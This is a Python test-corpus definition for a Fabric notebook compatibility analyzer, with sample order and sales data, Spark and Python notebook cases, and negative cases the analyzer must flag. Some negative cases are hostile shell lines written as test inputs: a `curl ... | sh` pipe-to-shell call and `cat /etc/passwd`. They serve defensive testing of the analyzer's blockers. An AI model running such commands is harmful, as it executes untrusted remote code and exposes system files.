# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Justin Dodrill
"""Definitions of the golden compatibility corpus.

Every case is one notebook (a list of cells, serialised both as ``notebook.ipynb`` and as the Fabric Git format ``notebook-content.py``), its input data, the analyzer options it
is analysed with, the run parameters, and an independent hand-written ``standalone.py`` (plain PySpark / Python / delta-rs, no Fabric API) that computes the same result.
``python tests/corpus/regen.py`` writes the fixtures (``--fixtures``) and the goldens (``--analysis``, ``--data``); ``test_corpus.py`` verifies the committed files against the code.

Goldens are never edited by hand: ``expected.analysis.json`` comes from the analyzer (reviewed in the diff when a rule changes), ``expected.data.json`` from the standalone
equivalent. The notebook run through the production runner must reproduce it exactly.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

HERE = Path(__file__).resolve().parent
CASES_DIR = HERE / "cases"
NEG_DIR = HERE / "negative"
#: where a local lakehouse is rooted in the golden analysis (rewrites mention it; the data runs use a real temp directory instead)
ANALYSIS_ROOT = "/lakehouse-root/bronze"

ORDERS = """order_id,customer_id,sku,qty,price,order_date,status
1,c1,A-100,2,10.50,2026-09-01,paid
2,c1,B-200,1,99.99,2026-09-03,paid
3,c2,A-100,5,10.50,2026-09-03,refunded
4,c3,C-300,3,7.25,2026-09-05,paid
5,c2,B-200,1,99.99,2026-09-08,paid
6,c4,A-100,10,10.50,2026-09-09,paid
7,c1,C-300,4,7.25,2026-09-12,paid
8,,A-100,1,10.50,2026-09-12,paid
"""
CUSTOMERS = """customer_id,name,country
c1,Alice,US
c2,Bob,DE
c3,Carol,US
c5,Eve,FR
"""
SALES = """region,rep,month,amount
east,ann,2026-01,100
east,ann,2026-02,150
east,bob,2026-01,90
east,bob,2026-02,95
west,cy,2026-01,200
west,cy,2026-02,180
west,di,2026-01,60
west,di,2026-02,70
"""

Cell = tuple  # (type, source[, tags])


@dataclass
class Case:
    name: str
    description: str
    cells: list[Cell]
    engine: str = "python"                       # python | spark
    primary: str = "ipynb"                       # the format the data run uses (the other one is checked for identical analysis)
    files: dict[str, str] = field(default_factory=dict)       # relative to input/Files/
    parameters: dict[str, Any] = field(default_factory=dict)
    lakehouse: str = "local"                     # analyzer view of the default lakehouse: local | remote | none
    extra_lakehouses: list[str] = field(default_factory=list)  # names of additional local lakehouses (each gets input/<name>/Files)
    bundled: dict[str, list[Cell]] = field(default_factory=dict)
    data_run: str = "notebook"                   # notebook | standalone-only (the runtime lacks what the notebook needs; see ``why``)
    why: str = ""
    allow_pip: bool = False
    allow_shell: bool = False
    needs: str = ""                              # "delta" when the notebook needs the Delta jars
    standalone_engine: str = ""                  # engine of standalone.py when it differs from the notebook engine (delta-rs instead of Spark)


def _p(source: str) -> Cell:
    return ("code", source, ["parameters"])


def _c(source: str) -> Cell:
    return ("code", source)


def _md(source: str) -> Cell:
    return ("markdown", source)


EXIT = "notebookutils.notebook.exit(json.dumps(result, sort_keys=True))"

CASES: dict[str, Case] = {}


def add(case: Case) -> None:
    CASES[case.name] = case


# ------------------------------------------------------------------------------------------------ ETL
add(Case(
    "etl_orders", "CSV -> cleanse -> derive -> parquet -> read back and aggregate; relative Files/ paths, parameter cell", engine="spark", primary="ipynb",
    files={"orders.csv": ORDERS}, parameters={"min_qty": 2},
    cells=[
        _md("# Orders ETL"),
        _p('source_path = "Files/orders.csv"\nout_path = "Files/out/orders_clean"\nmin_qty = 1'),
        _c("import json\nfrom pyspark.sql import functions as F\n\nraw = spark.read.option('header', True).csv(source_path)\n"
           "clean = (raw.where(F.col('customer_id').isNotNull())\n"
           "         .withColumn('qty', F.col('qty').cast('int'))\n"
           "         .withColumn('price', F.col('price').cast('double'))\n"
           "         .withColumn('order_date', F.to_date('order_date'))\n"
           "         .where(F.col('status') == 'paid')\n"
           "         .where(F.col('qty') >= min_qty)\n"
           "         .withColumn('revenue', F.round(F.col('qty') * F.col('price'), 2)))\n"
           "clean.write.mode('overwrite').parquet(out_path)"),
        _c("back = spark.read.parquet(out_path)\n"
           "agg = back.groupBy('customer_id').agg(F.round(F.sum('revenue'), 2).alias('revenue')).collect()\n"
           "result = {'rows': back.count(), 'revenue_by_customer': {r['customer_id']: r['revenue'] for r in agg},\n"
           "          'months': sorted(r[0] for r in back.select(F.date_format('order_date', 'yyyy-MM')).distinct().collect())}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ joins
add(Case(
    "joins", "inner / left / left-anti / broadcast joins and a self-join, Fabric Git source format", engine="spark", primary="fabricGitSource",
    files={"orders.csv": ORDERS, "customers.csv": CUSTOMERS},
    cells=[
        _c("import json\nfrom pyspark.sql import functions as F\n\n"
           "orders = spark.read.option('header', True).csv('Files/orders.csv').withColumn('qty', F.col('qty').cast('int')).where(F.col('customer_id').isNotNull())\n"
           "customers = spark.read.option('header', True).csv('Files/customers.csv')"),
        _c("inner = orders.join(customers, 'customer_id', 'inner')\nleft = orders.join(customers, 'customer_id', 'left')\n"
           "anti = orders.join(customers, 'customer_id', 'left_anti')\nbcast = orders.join(F.broadcast(customers), 'customer_id').groupBy('country').agg(F.sum('qty').alias('qty'))"),
        _c("a = orders.alias('a')\nb = orders.alias('b')\n"
           "same_sku = a.join(b, (F.col('a.sku') == F.col('b.sku')) & (F.col('a.order_id') < F.col('b.order_id'))).count()"),
        _c("result = {\n    'inner': sorted(r['order_id'] for r in inner.collect()),\n    'left_null_names': sorted(r['order_id'] for r in left.where(F.col('name').isNull()).collect()),\n"
           "    'anti': sorted(r['customer_id'] for r in anti.select('customer_id').distinct().collect()),\n"
           "    'qty_by_country': {r['country']: r['qty'] for r in bcast.collect()},\n    'same_sku_pairs': same_sku,\n}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ windows
add(Case(
    "windows", "row_number / rank / lag / running totals / moving average over partitions", engine="spark", primary="ipynb",
    files={"sales.csv": SALES},
    cells=[
        _c("import json\nfrom pyspark.sql import Window, functions as F\n\n"
           "sales = spark.read.option('header', True).csv('Files/sales.csv').withColumn('amount', F.col('amount').cast('int'))"),
        _c("by_region = Window.partitionBy('region').orderBy(F.col('amount').desc(), 'rep', 'month')\n"
           "running = Window.partitionBy('region', 'rep').orderBy('month').rowsBetween(Window.unboundedPreceding, Window.currentRow)\n"
           "ordered = Window.partitionBy('rep').orderBy('month')\n"
           "w = (sales.withColumn('rn', F.row_number().over(by_region)).withColumn('rank', F.rank().over(Window.partitionBy('region').orderBy(F.col('amount').desc())))\n"
           "         .withColumn('running', F.sum('amount').over(running)).withColumn('prev', F.lag('amount', 1).over(ordered))\n"
           "         .withColumn('delta', F.col('amount') - F.col('prev')))"),
        _c("top = {r['region']: [r['rep'], r['month'], r['amount']] for r in w.where('rn = 1').collect()}\n"
           "running_end = {f\"{r['rep']}\": r['running'] for r in w.where(\"month = '2026-02'\").collect()}\n"
           "deltas = {r['rep']: r['delta'] for r in w.where(\"month = '2026-02'\").collect()}\n"
           "ranks = sorted([r['region'], r['rep'], r['month'], r['rank']] for r in w.collect())\n"
           "result = {'top': top, 'running_end': running_end, 'deltas': deltas, 'ranks': ranks}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ udfs
add(Case(
    "udfs", "Python UDFs (decorator and registered for SQL), Fabric Git source format", engine="spark", primary="fabricGitSource",
    files={"customers.csv": CUSTOMERS},
    cells=[
        _c("import json\nfrom pyspark.sql import functions as F\nfrom pyspark.sql.types import StringType, IntegerType\n\n"
           "@F.udf(returnType=StringType())\ndef initials(name):\n    return None if name is None else name[:1].upper() + '.'\n\n"
           "def region_of(country):\n    return {'US': 'AMER', 'DE': 'EMEA', 'FR': 'EMEA'}.get(country, 'OTHER')\n\n"
           "spark.udf.register('region_of', region_of, StringType())\nspark.udf.register('name_len', lambda s: len(s) if s else 0, IntegerType())"),
        _c("df = spark.read.option('header', True).csv('Files/customers.csv')\ndf.createOrReplaceTempView('customers')\n"
           "a = df.withColumn('initials', initials('name')).orderBy('customer_id').collect()\n"
           "b = spark.sql('select customer_id, region_of(country) as region, name_len(name) as n from customers order by customer_id').collect()"),
        _c("result = {'initials': {r['customer_id']: r['initials'] for r in a}, 'region': {r['customer_id']: r['region'] for r in b}, 'name_len': {r['customer_id']: r['n'] for r in b}}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ spark sql + magics
add(Case(
    "spark_sql", "%%sql cells, temp views, CTEs, window SQL and spark.sql with a parameter", engine="spark", primary="ipynb",
    files={"orders.csv": ORDERS, "customers.csv": CUSTOMERS}, parameters={"country": "US"},
    cells=[
        _p("country = 'DE'"),
        _c("import json\nfrom pyspark.sql import functions as F\n\n"
           "spark.read.option('header', True).csv('Files/orders.csv').withColumn('qty', F.col('qty').cast('int')).withColumn('price', F.col('price').cast('double')).createOrReplaceTempView('orders')\n"
           "spark.read.option('header', True).csv('Files/customers.csv').createOrReplaceTempView('customers')"),
        ("code", "%%sql\nCREATE OR REPLACE TEMP VIEW paid AS SELECT * FROM orders WHERE status = 'paid' AND customer_id IS NOT NULL"),
        _c("by_country = spark.sql(f\"\"\"\n    WITH j AS (SELECT c.country, o.qty, o.price FROM paid o JOIN customers c USING (customer_id))\n"
           "    SELECT country, COUNT(*) AS n, ROUND(SUM(qty * price), 2) AS revenue FROM j WHERE country = '{country}' GROUP BY country\n\"\"\").collect()\n"
           "ranked = spark.sql('SELECT customer_id, RANK() OVER (ORDER BY qty DESC) AS r FROM paid').orderBy('customer_id', 'r').collect()"),
        _c("result = {'by_country': {r['country']: [r['n'], r['revenue']] for r in by_country}, 'ranked': [[r['customer_id'], r['r']] for r in ranked]}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ delta merge
add(Case(
    "delta_merge", "Delta MERGE (DeltaTable API and SQL MERGE INTO) with a Delta table in the default lakehouse", engine="spark", primary="ipynb", needs="delta", standalone_engine="python",
    data_run="standalone-only", why="the cached test runtime has no Delta jars (no route to Maven Central in the build sandbox); the notebook run is skipped unless the runtime has them",
    files={"orders.csv": ORDERS}, parameters={},
    cells=[
        _c("import json\nfrom delta.tables import DeltaTable\nfrom pyspark.sql import functions as F\n\n"
           "base = spark.read.option('header', True).csv('Files/orders.csv').select('order_id', 'status').withColumn('order_id', F.col('order_id').cast('int'))\n"
           "base.write.format('delta').mode('overwrite').save('Tables/order_status')"),
        _c("updates = spark.createDataFrame([(3, 'paid'), (9, 'paid')], ['order_id', 'status'])\ntarget = DeltaTable.forPath(spark, 'Tables/order_status')\n"
           "(target.alias('t').merge(updates.alias('u'), 't.order_id = u.order_id').whenMatchedUpdate(set={'status': 'u.status'}).whenNotMatchedInsertAll().execute())"),
        _c("spark.sql(\"MERGE INTO delta.`Tables/order_status` t USING (SELECT 1 AS order_id, 'void' AS status) u ON t.order_id = u.order_id WHEN MATCHED THEN UPDATE SET t.status = u.status\")"),
        _c("rows = spark.read.format('delta').load('Tables/order_status').orderBy('order_id').collect()\n"
           "result = {'rows': [[r['order_id'], r['status']] for r in rows], 'versions': DeltaTable.forPath(spark, 'Tables/order_status').history().count()}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ multi lakehouse (pure Python)
add(Case(
    "multi_lakehouse", "default lakehouse plus a second one: /lakehouse/default open(), notebookutils.lakehouse.get and notebookutils.fs across both", engine="python", primary="fabricGitSource",
    files={"orders.csv": ORDERS}, extra_lakehouses=["silver"],
    cells=[
        _c("import csv, json\n\nsilver = notebookutils.lakehouse.get('silver')\nsilver_files = silver['properties']['oneLakeFilesPath']"),
        _c("with open('/lakehouse/default/Files/orders.csv') as fh:\n    rows = list(csv.DictReader(fh))\npaid = [r for r in rows if r['status'] == 'paid' and r['customer_id']]"),
        _c("totals = {}\nfor r in paid:\n    totals[r['customer_id']] = round(totals.get(r['customer_id'], 0) + int(r['qty']) * float(r['price']), 2)\n"
           "notebookutils.fs.mkdirs(silver_files + '/curated')\nnotebookutils.fs.put(silver_files + '/curated/totals.json', json.dumps(totals, sort_keys=True), True)"),
        _c("back = json.loads(notebookutils.fs.head(silver_files + '/curated/totals.json'))\n"
           "names = sorted(lh['displayName'] for lh in notebookutils.lakehouse.list())\n"
           "result = {'lakehouses': names, 'default': notebookutils.runtime.context['defaultLakehouseName'], 'totals': back, 'silver_ls': sorted(f.name for f in notebookutils.fs.ls(silver_files + '/curated'))}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ parameters (pure Python)
add(Case(
    "parameters", "parameter cell with typed defaults overridden by the run, nothing else leaks in", engine="python", primary="ipynb",
    parameters={"run_date": "2026-10-07", "limit": 3, "dry_run": False, "tags": ["a", "b"]},
    cells=[
        _p("run_date = '2026-01-01'\nlimit = 10\ndry_run = True\nratio: float = 0.5\ntags = []"),
        _c("import json, datetime\nd = datetime.date.fromisoformat(run_date)"),
        _c("result = {'run_date': run_date, 'weekday': d.strftime('%A'), 'limit': limit, 'limit_type': type(limit).__name__, 'dry_run': dry_run, 'ratio': ratio, 'tags': tags,\n"
           "          'first': list(range(limit))}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ pipeline invocation
add(Case(
    "pipeline_invocation", "notebookutils.notebook.run / runMultiple of child notebooks and the exit value a pipeline reads", engine="python", primary="ipynb", parameters={"batch": 7},
    data_run="standalone-only", why="notebook.run submits a child job through the control plane callbacks; the harness runs the runner without a control plane (covered by the end-to-end tests)",
    cells=[
        _p("batch = 1"),
        _c("import json\nchild = notebookutils.notebook.run('child_load', 120, {'batch': batch})\nchild_result = json.loads(child)"),
        _c("many = notebookutils.notebook.runMultiple({'activities': [{'name': 'load', 'path': 'child_load', 'args': {'batch': 1}}, "
           "{'name': 'validate', 'path': 'child_validate', 'dependencies': ['load']}]})"),
        _c("result = {'batch': batch, 'child': child_result, 'ok': child_result['rows'] == batch * 10}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ magics (pure Python, %run inlined)
add(Case(
    "magics", "%run of a bundled notebook (inlined) and a %%pyspark language cell magic", engine="python", primary="fabricGitSource",
    bundled={"helpers": [_c("def tax(amount, rate=0.2):\n    return round(amount * (1 + rate), 2)\n\nCONSTANT = 42")]},
    cells=[
        _c("%run helpers"),
        _c("import json\nprices = [10, 20.5, 99.99]"),
        ("code", "%%pyspark\nvalues = [tax(p) for p in prices]"),
        _c("result = {'values': values, 'constant': CONSTANT}\n" + EXIT),
    ]))

# ------------------------------------------------------------------------------------------------ negative notebooks
@dataclass
class Negative:
    name: str
    cells: list[Cell]
    blockers: list[str]
    lakehouse: str = "local"
    allow_pip: bool = False
    allow_shell: bool = False
    description: str = ""


NEGATIVES: list[Negative] = [
    Negative("sempy", [_c("import sempy.fabric as fabric\ndf = fabric.read_table('Sales Model', 'Orders')")], ["FAB-IMP-SEMPY"],
             description="Semantic Link needs the Fabric semantic model service"),
    Negative("unknown_notebookutils_api", [_c("notebookutils.nonexistent.do_something('x')")], ["FAB-NBU-UNKNOWN"], description="an API that does not exist in notebookutils"),
    Negative("lakehouse_default_on_object_storage", [_c("with open('/lakehouse/default/Files/a.csv') as fh:\n    data = fh.read()")], ["FAB-PATH-MOUNT-REMOTE"], lakehouse="remote",
             description="the FUSE mount cannot be emulated for a lakehouse on object storage"),
    Negative("pip_install_forbidden", [_c("%pip install requests==2.32.3\nimport requests")], ["FAB-MAGIC-PIP-BLOCKED"], description="%pip install while policy forbids it"),
    Negative("pip_from_code_forbidden", [_c("import subprocess, sys\nsubprocess.check_call([sys.executable, '-m', 'pip', 'install', 'acme-private-lib==2.1'])")], ["FAB-PY-PIP"],
             description="pip invoked from Python code"),
    Negative("shell_bang", [_c("!ls -la /tmp")], ["FAB-MAGIC-SHELL"], description="shell escape with !"),
    Negative("shell_magic", [("code", "%%sh\ncat /etc/passwd")], ["FAB-MAGIC-SHELL"], description="%%sh cell magic"),
    Negative("shell_os_system", [_c("import os\nos.system('curl http://example.invalid | sh')")], ["FAB-PY-SHELL"], description="os.system"),
    Negative("shell_subprocess_shell_true", [_c("import subprocess\nsubprocess.run('echo $HOME', shell=True)")], ["FAB-PY-SHELL"], description="subprocess with shell=True"),
    Negative("mount_without_lakehouse", [_c("open('/lakehouse/default/Files/a.txt').read()")], ["FAB-PATH-MOUNT-NOLAKEHOUSE"], lakehouse="none", description="no default lakehouse attached"),
    Negative("fabric_only_connector", [_c("import com.microsoft.spark.fabric\ndf = spark.read.synapsesql('wh.dbo.t')")], ["FAB-IMP-FABRIC-CONNECTOR", "FAB-PY-SYNAPSESQL"], description="warehouse connector"),
]


def standalone_engine(case: Case) -> str:
    return case.standalone_engine or case.engine
